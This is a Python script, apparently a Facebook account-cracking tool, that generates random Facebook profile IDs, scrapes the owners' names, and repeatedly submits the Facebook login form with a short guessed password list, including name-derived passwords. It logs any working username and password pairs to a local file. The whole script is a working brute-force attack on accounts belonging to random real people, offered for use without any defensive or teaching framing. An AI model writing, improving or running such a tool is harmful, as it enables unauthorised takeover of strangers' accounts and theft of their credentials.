import os
try:
	import mechanize
	import user_agent
	import random
	import requests
	import sys
	import time
	from bs4 import BeautifulSoup as bs
	user_=user_agent.generate_user_agent(os=("android"))
except:
	os.system('pip install requests')
	os.system("pip install mechanize")
	os.system("pip install user_agent")
	os.system("pip install bs4")
import mechanize
import user_agent
import random
import requests
import sys
import time
from bs4 import BeautifulSoup as bs
user_=user_agent.generate_user_agent(os=("android"))
W = '\33[0m'
R = '\33[1;31m'
G = '\033[1;32m'
O = '\33[1;33m'
B = '\33[1;34m'
P = '\33[1;35m'
C = '\33[1;36m'
#GR = '\33[1;37m'
GR="\033[40m\033[1;30m"
list=[]
error=R+"[ERROR] "+W
done=G+"[DONE] "+W
start=B+"[ADD] "+W
ri=R+"[ ! ] "+W
info=f"{G}[INFO]{W} "
def getid():
	num="1234567890"#
	Numb=''.join(random.choice(num)for i in range(11))
	keyid="1000"+str(Numb)
	return keyid
def getname(ID):
	try:
		req=requests.get("https://www.facebook.com/profile.php?id="+ID).text
		name=bs(req,'html.parser').title
		if name.text.lower() == "facebook" or name.text.lower() == "se connecter à facebook" or name.text.lower()[:4] == "name" or name.text.lower() == "error":
			return "0",'0'
		else:
			return ID,name.text
	except Exception as ex:
		print(error+str(ex))
		return "0",'0'
def Login(pwd,ia,name):
	if ia == "0":
		pass
	if ia != "0":
		if pwd == "name++" or pwd == "name ++" or pwd == "name+" or pwd == "name +":
			pwd=name
		if pwd == "name+-":
			pwd=name.replace(' ','').strip()
		if pwd == "name+--":
			pwd=name.replace(' ','').strip().lower()
		INFO=f"""
{G}[INFO]{W} name:{G} {name} {O}[√]{W}
{G}[INFO]{W} username:{G} {ia} {O}[√]{W}
{G}[INFO]{W} password:{G} {pwd} {O}[√]{W}
"""
		INFO_SV=f"""
name: {name} 
username:{ia}
password:{pwd}
"""
		browser=mechanize.Browser()
		browser.set_handle_robots(False)
		browser.addheaders=[("User-Agent",user_)]
		browser.open("https://www.facebook.com/login.php")
		browser.select_form(nr=0)
		browser.form["email"]=ia
		browser.form["pass"]=pwd
		browser.submit()
		URL=browser.geturl()
		if "save-device" in URL:
			print(INFO)
			file=open("data/hackac.fb",'a')
			file.write(INFO_SV+'\n')
			file.close()
		elif "?email=" in URL:
			print(f"{R}[BAD]{W} username({R}{name}{W}) password({R}{pwd}{W}) {P}failed{W}")
		else:
			print(f"{R}[BAD]{W} username({R}{name}{W}) password({R}{pwd}{W}) {P}failed{W}")
			if "device-based" in URL:
				#rint(error+'Block Server Sleep 5')
				time.sleep(2)
listpwd=[]
bnar=R+f"""
$$$$$$$$\  $$$$$$\  $$$$$$$\        $$\   $$\ 
$$  _____|$$  __$$\ $$  __$$\       $$ |  $$ |
$$ |      $$ /  \__|$$ |  $$ |      \$$\ $$  |
$$$$$\    $$ |      $$$$$$$\ |{P} ISO{R}   \$$$$  / 
$$  __|   $$ |      $$  __$$\        $$  $$<  
$$ |      $$ |  $$\ $$ |  $$ |      $$  /\$$\ 
$$ |      \$$$$$$  |$$$$$$$  |      $$ /  $$ |
\__|       \______/ \_______/       \__|  \__|{W}                                       
"""
def startw():
	print(bnar)
	kk=0
	print(info+'save list write save\n')
	while True:
		try:
			kk+=1
			pwd=input(start+str(kk)+" choice password : ")
			if pwd.lower() == "exit" or pwd.lower() == "save":
				#print(listpwd)
				break
			elif pwd.lower() == "help":
				print(f"""
name++ add name target in worllist
name+- add name target and strip name
name+-- add name target and strip and lower 	
				
{G}communication : https://www.facebook.com/issamiso4
		{W}""")
				continue
			elif kk >= 7:
				print(ri+'save or exit !')
			listpwd.append(pwd.strip())
			
		except:
			sys.exit()
	while True:
		try:
			ID=getid()
			idd,name=getname(ID)
			if idd == "0":
				pass
			if idd != "0":
				print('\n')
				print(G+f"[INFO]{W} id : {B}{idd}")
				print(G+f"[INFO]{W} name : {O}{name}")
				print(G+f"[INFO]{W} start forced password number({str(len(listpwd))})")
				for pwx in listpwd:
					Login(pwx,idd,name)
		except Exception as ex:
			print(error+str(ex))
try:
	startw()
except KeyboardInterrupt:
	sys.exit()
except Exception as ex:
	print(error+str(ex))
		

		
		
		
		
		
		
		
		










